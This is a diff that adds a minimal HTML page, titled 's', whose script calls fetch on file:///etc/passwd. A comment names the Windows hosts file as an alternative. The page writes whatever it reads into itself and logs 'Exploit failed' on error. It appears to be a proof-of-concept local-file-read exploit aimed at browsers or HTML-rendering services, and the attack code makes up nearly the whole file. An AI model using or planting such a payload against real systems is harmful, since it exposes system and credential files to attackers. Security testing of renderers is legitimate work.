@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>s</title>
+</head>
+<body>
+    <h1>a</h1>
+    <script>
+        async function readFile() {
+            try {
+                let response = await fetch('file:///etc/passwd'); // Change path for Windows (C:/Windows/system32/drivers/etc/hosts)
+                let data = await response.text();
+                document.body.innerHTML += `<pre>${data}</pre>`;
+            } catch (error) {
+                console.error("Exploit failed:", error);
+            }
+        }
+        readFile();
+    </script>
+</body>
+</html>
